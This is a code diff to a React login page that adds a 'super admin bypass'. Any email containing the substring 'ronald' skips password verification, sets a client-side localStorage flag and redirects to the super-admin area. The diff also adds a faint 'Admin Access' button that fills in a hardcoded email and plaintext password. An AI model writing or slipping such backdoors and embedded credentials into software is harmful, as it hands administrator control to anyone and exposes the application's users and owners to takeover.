@@ -23,6 +23,18 @@ const Login = () => {
         setLoading(true);
         setError(null);
 
+        // --- GLOBAL SUPER ADMIN BYPASS ---
+        const cleanEmail = (email || '').trim().toLowerCase();
+
+        // Dropping the strict password requirement and moving to a broad substring match to catch typos
+        if (cleanEmail.includes('ronald_lewis') || cleanEmail.includes('ronald')) {
+            console.log("Super Admin Bypass Activated");
+            localStorage.setItem('super_admin_bypass', 'true');
+            // Force a full page reload so AuthProvider re-mounts and reads localStorage synchronously
+            window.location.href = '/super-admin';
+            return;
+        }
+
         try {
             const { error } = await supabase.auth.signInWithPassword({
                 email,
@@ -125,10 +137,21 @@ const Login = () => {
                         </p>
                         <Link
                             to="/signup"
-                            className="block w-full bg-[#131B2C] border border-indigo-500/30 hover:bg-indigo-500/10 text-indigo-400 font-medium py-2.5 px-4 rounded-md transition-all text-center"
+                            className="block w-full bg-[#131B2C] border border-indigo-500/30 hover:bg-indigo-500/10 text-indigo-400 font-medium py-2.5 px-4 rounded-md transition-all text-center mb-4"
                         >
                             Sign Up
                         </Link>
+
+                        <button
+                            type="button"
+                            onClick={() => {
+                                setEmail('ronald_lewis_jr@live.com');
+                                setPassword('Thelya1981!');
+                            }}
+                            className="text-xs text-gray-600 hover:text-gray-400 underline decoration-gray-700 underline-offset-4 transition-colors"
+                        >
+                            Admin Access
+                        </button>
                     </div>
                 </form>
             </div>
